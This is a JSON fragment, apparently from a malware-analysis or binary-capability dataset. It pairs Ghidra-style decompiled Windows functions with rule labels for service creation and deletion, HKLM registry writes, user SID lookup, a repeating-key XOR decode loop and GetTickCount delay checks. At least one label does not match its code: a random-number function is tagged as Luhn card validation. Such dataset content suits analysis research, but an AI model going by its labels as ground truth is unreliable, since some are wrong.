        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404f6d) overlaps instruction at (ram,0x00404f69)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nbool __fastcall fcn.00404f50(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    uint uStack8;\n    \n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        uStack8 = 1;\n        in_EAX = param_3;\n    }\n    *unaff_EDI = *unaff_ESI;\n    *(param_2 + 1) = *(param_2 + 1) | param_1 >> 8;\n    *(in_EAX + -4) = &stack0xfffffff8;\n    *(in_EAX + -8) = 0x404f78;\n    iVar1 = fcn.00404720();\n    return iVar1 != 0;\n}\n",
        "token_count": 256
    },
    "00405060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00405060(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "00402710": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get session user name"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402710(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *unaff_ESI;\n    bool bVar2;\n    unkbyte6 Var3;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &Sid, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    Var3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&Sid, arg_8h);\n    bVar2 = Var3 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((!bVar2) && (bVar2)) {\n        out(*unaff_ESI, Var3 >> 0x20);\n    }\n    return 1;\n}\n",
        "token_count": 323
    },
    "00402d00": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402d00(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 108
    },
    "00402a60": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a60(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00402d80": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402dc1) overlaps instruction at (ram,0x00402dbc)\n// \n\nvoid __cdecl fcn.00402d80(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_EAX;\n    uint8_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    uVar2 = 0;\n    if (arg_14h != 0) {\n        do {\n            bVar3 = (POPCOUNT((in_EAX >> 8 ^ 0x68) & 0x30) & 1U) != 0;\n            if ((bVar3) && (!bVar3)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar1 = *(uVar2 + arg_10h) ^ *(uVar2 % arg_ch + arg_8h);\n            if ((uVar1 < '\\x01') || ('\\0' < uVar1)) {\n                *(uVar2 + arg_10h) = uVar1;\n                uVar2 = uVar2 + 1;\n            }\n            uVar2 = uVar2 + 1;\n            in_EAX = arg_8h;\n        } while (uVar2 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 328
    },
    "00404a40": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404a40(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x42430c, 0x424350, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 79
    },
    "00402e90": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402e90(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(arg_8h, arg_ch, 0xf01ff);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 128
    }
}